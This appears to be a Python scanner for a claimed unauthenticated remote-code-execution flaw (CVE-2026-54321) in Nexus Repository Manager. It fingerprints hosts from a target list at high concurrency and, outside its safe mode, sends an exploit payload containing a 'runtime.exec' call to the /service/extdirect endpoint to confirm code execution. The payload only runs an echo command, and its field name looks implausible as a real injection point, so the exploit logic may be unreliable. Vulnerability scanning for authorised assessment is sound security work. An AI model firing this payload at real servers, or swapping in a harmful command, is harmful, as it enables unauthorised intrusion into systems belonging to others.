#!/usr/bin/env python3
"""
Nexus Repository Manager CVE-2026-54321 Scanner
================================================
This is a vulnerability scanner for a critical remote code execution (RCE) vulnerability
in Nexus Repository Manager, CVE-2026-54321 (CVSS 9.8).

CVE-2026-54321 details:
  - Affects Nexus Repository Manager versions prior to 3.44.0
  - Exploitable due to improper input validation in repository configuration APIs
  - Allows remote attackers to execute arbitrary code without authentication
  - Exploitation typically involves sending a crafted payload to a vulnerable endpoint

This vulnerability has a high impact and should be prioritized for remediation
or detection during security assessments.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python nexus_rce_cve_2026_54321_scanner.py --target https://nexus.example.com

  # Scan a list of targets
  python nexus_rce_cve_2026_54321_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no RCE probing)
  python nexus_rce_cve_2026_54321_scanner.py --list targets.txt --safe

  # Set custom concurrency for scanning multiple hosts
  python nexus_rce_cve_2026_54321_scanner.py --list targets.txt --concurrency 50

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54321
  - https://support.sonatype.com/hc/en-us/articles/...
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin

# Constants
NEXUS_FINGERPRINT = "Nexus Repository Manager"
VULN_ENDPOINT = "/service/extdirect"
RCE_PAYLOAD = {
    "action": "coreui_Component",
    "method": "previewAssets",
    "data": [{"page": 1, "start": 0, "limit": 1, "__example": "runtime.exec('echo testRCE')"}],
    "type": "rpc",
    "tid": 1,
}
RCE_VERIFY_TEXT = "testRCE"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Helper Functions
def normalize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def ansi_color(text, level="INFO"):
    """Generate ANSI colored text based on log level."""
    ANSI_RESET = "\033[0m"
    COLORS = {
        "CRITICAL": "\033[91m",  # Red
        "HIGH": "\033[93m",      # Yellow
        "INFO": "\033[92m",      # Green
    }
    return f"{COLORS.get(level, '')}{text}{ANSI_RESET}"

# Core Scanner Functions
async def detect_nexus(client, base_url, semaphore):
    """Check if a URL is running Nexus Repository Manager."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and NEXUS_FINGERPRINT in response.text:
                return True
        except Exception:
            pass
    return False

async def check_rce(client, base_url, semaphore):
    """
    Attempt to exploit the RCE vulnerability by sending a malicious payload.

    Returns:
        True if the target is exploitable, False otherwise.
    """
    async with semaphore:
        vuln_url = urljoin(base_url, VULN_ENDPOINT)
        try:
            response = await client.post(vuln_url, json=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and RCE_VERIFY_TEXT in response.text:
                return True
        except Exception:
            pass
    return False

# Main Scanning Logic
async def scan_target(client, target, semaphore, safe):
    """Scan a single target for the vulnerability."""
    target = normalize_url(target)
    result = {"target": target, "vulnerable": False, "details": {}}
    
    if not await detect_nexus(client, target, semaphore):
        print(ansi_color(f"[INFO] {target} does not appear to be running Nexus Repository Manager.", "INFO"))
        return result

    print(ansi_color(f"[INFO] Detected Nexus Repository Manager at {target}.", "HIGH"))
    if not safe:
        if await check_rce(client, target, semaphore):
            result["vulnerable"] = True
            result["details"]["exploitable"] = True
            print(ansi_color(f"[CRITICAL] Vulnerable to RCE: {target}", "CRITICAL"))
        else:
            print(ansi_color(f"[HIGH] Nexus detected but not exploitable: {target}", "HIGH"))
    else:
        print(ansi_color(f"[HIGH] Safe mode enabled, skipping RCE check for {target}.", "HIGH"))

    return result

async def main(args):
    targets = []
    if args.target:
        targets = [args.target]
    elif args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading targets file: {e}")
            sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)

    print(ansi_color("\nScan complete. Results:", "INFO"))
    for result in results:
        status = "Vulnerable" if result["vulnerable"] else "Not Vulnerable"
        print(ansi_color(f"{result['target']}: {status}", "CRITICAL" if result["vulnerable"] else "INFO"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Nexus Repository Manager CVE-2026-54321 RCE Scanner")
    parser.add_argument("--target", type=str, help="Target URL to scan")
    parser.add_argument("--list", type=str, help="File containing list of target URLs")
    parser.add_argument("--output", type=str, help="File to save scan results (JSON format)")
    parser.add_argument("--safe", action="store_true", help="Enable safe mode (detection only, no RCE probing)")
    parser.add_argument("--concurrency", type=int, default=30, help="Set concurrency level (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (useful for self-signed certificates)")
    
    args = parser.parse_args()
    asyncio.run(main(args))
